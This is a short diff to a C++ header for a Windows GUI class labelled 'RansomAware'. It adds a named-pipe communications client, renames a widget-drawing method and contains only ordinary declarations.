@@ -4,6 +4,7 @@
 #include <map>
 #include <chrono>
 #include "..\include\singleton.hpp"
+#include "..\include\ComsClient.hpp"
 
 namespace gui
 {
@@ -67,7 +68,7 @@ private:
 	void						drawText(const std::wstring& text, int x, int y, const Fonts& font, COLORREF color, bool center = false);
 	void						createImages();
 	RECT						getWidgetRect(const Widget& widget);
-	void						redrawWidgets();
+	void						drawWidgets();
 
 	const std::wstring			m_label { L"RansomAware" };
 	const uint32_t				m_windowSize[2]{ 900, 520 };
@@ -82,6 +83,9 @@ private:
 	WNDCLASSEX					m_windowClass;
 	HBRUSH						m_bgBrush;
 	TimePoint					m_endTime;
+
+	//Coms
+	std::unique_ptr<NamedPipeClient> m_comsClient;
 };
 
 } // namespace gui
